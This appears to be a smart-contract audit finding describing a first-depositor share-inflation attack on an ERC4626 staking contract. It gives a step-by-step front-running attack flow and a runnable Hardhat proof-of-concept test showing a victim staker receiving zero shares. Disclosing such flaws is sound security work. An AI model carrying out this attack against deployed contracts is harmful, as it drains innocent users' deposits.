
| ID                                                                                                                                                          | Title                                                                                                                                              | Severity |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | -------- |
| [C-01](staking contract is vulnerable to inflation attack making malicious 1st staker Grief the following stakers)                                          | staking contract is vulnerable to inflation attack making malicious 1st staker Grief the following stakers                                         | Critical |

## [H-01] staking contract is vulnerable to inflation attack making malicious 1st staker Grief the following stakers

### Brief/Intro
staking contract is using standard erc4626 vaults with default implementation espicially `_decimalsOffset` value.

This opens an attack vector for the 1st staker to Grief the following stakers 
### Vulnerability Details
the staking contract is using standard erc4626 which help preventing inflation attacks where a malicious user could steal funds from other users,

however as its using the default `_decimalsOffset` this makes the vault vulnerable to grieving attacks causing loss of funds to innocent stakers

flow of the attack is as follow 
1. A hacker back-runs the transaction of an ERC4626 pool creation.
2. The hacker mints for themself one share: deposit(1). Thus, totalAsset()1, totalSupply()1.
3. The hacker front-runs the deposit of the victim who wants to deposit 50 long (50e18).
4. The hacker inflates the denominator right in front of the victim: asset.transfer(100e18). 
5. Next, the victim's tx takes place. The victim gets zero shares.
6. The hacker wait for unlocking period and burns their share and gets portion of the money used for grieving the money.
7. or the hacker could repeat the same attack with the next staker direct transfering the coorect amount to cause total or partial loss of funds for the innocent staker.

### Impact Details

Total loss of funds for stakers

## References
https://github.com/belongnet/checkin-contracts/blob/6b78ead6186c49cfec2787522460ddd516579a6b/contracts/v2/periphery/Staking.sol#L242-L246

```solidity
File: Staking.sol
242:     function _deposit(address by, address to, uint256 assets, uint256 shares) internal override {
243:         super._deposit(by, to, assets, shares);
244:         // lock freshly minted shares
245:         stakes[to].push(Stake({shares: shares, timestamp: block.timestamp}));
246:     }
```









after completing the setup correctly add this in `staking.test.ts` under describe('Staking features') as shown below

Run the test on local network with prefunded accounts with the command 
` yarn hardhat test --network hardhat --grep "is vulnerable to inflation attack" ./test/v2/platform/staking.test.ts`

after running the test you'll notice that innocent uesr2 received 0 shares and suffered total loss of funds 

the cost of the attack for the attacker is 50% of `victemUser` deposits
so attacker pay `0.5` to cause a loss of `1`


```typescript

  describe('Staking features', () => {
    it('is vulnerable to inflation attack', async () => {
      const { staking, long, admin, user1, user2 } = await loadFixture(fixture);

      // Make amounts smaller but keep ratio high
      const minDeposit = ethers.utils.parseUnits("1", "wei");
      const largeAmount = ethers.utils.parseEther('100');
      const user2DepositAmount = ethers.utils.parseEther('50');

      // Give tokens to users
      await long.connect(admin).transfer(user1.address, largeAmount.add(minDeposit));
      await long.connect(admin).transfer(user2.address, user2DepositAmount);

      // User1 deposits minimum amount (1 wei) 
      await long.connect(user1).approve(staking.address, minDeposit);
      await staking.connect(user1).deposit(minDeposit, user1.address);
      
      // User1 directly transfers large amount to artificially inflate share price
      await long.connect(user1).transfer(staking.address, largeAmount);

      // Log share price before user2 deposit
      const totalSupply = await staking.totalSupply();
      const totalAssets = await staking.totalAssets();
      console.log("Share price after inflation:", totalAssets.toString(), "wei per", totalSupply.toString(), "shares");

      // User2 tries to deposit
      await long.connect(user2).approve(staking.address, user2DepositAmount);
      await staking.connect(user2).deposit(user2DepositAmount, user2.address);
      
      // Check shares received by user2
      const user2Shares = await staking.balanceOf(user2.address);
      console.log("User2 shares received:", user2Shares.toString());
      console.log("User2 deposit amount:", user2DepositAmount.toString());
      expect(user2Shares).to.be.lt(user2DepositAmount);
      
      // Enable withdrawals
      await staking.connect(admin).setMinStakePeriod(1);
      
      // User1 withdraws and gets most of the funds
      const user1Shares = await staking.balanceOf(user1.address);
      await staking.connect(user1).redeem(user1Shares, user1.address, user1.address);
      
      const user1FinalBalance = await long.balanceOf(user1.address);
      
      // User2 withdraws and gets nothing
      await staking.connect(user2).redeem(user2Shares, user2.address, user2.address);
      const user2FinalBalance = await long.balanceOf(user2.address);

      // showing amounts lost for the user2
      console.log("user1finalbalance: ", user1FinalBalance.toString());
      console.log("user2finalbalance: ", user2FinalBalance.toString());
      // Show the theft amount
      const LostAmount = user2DepositAmount.sub(user2FinalBalance);
      console.log("Amount lost from user2:", ethers.utils.formatEther(LostAmount), "LONG tokens");
    });
```
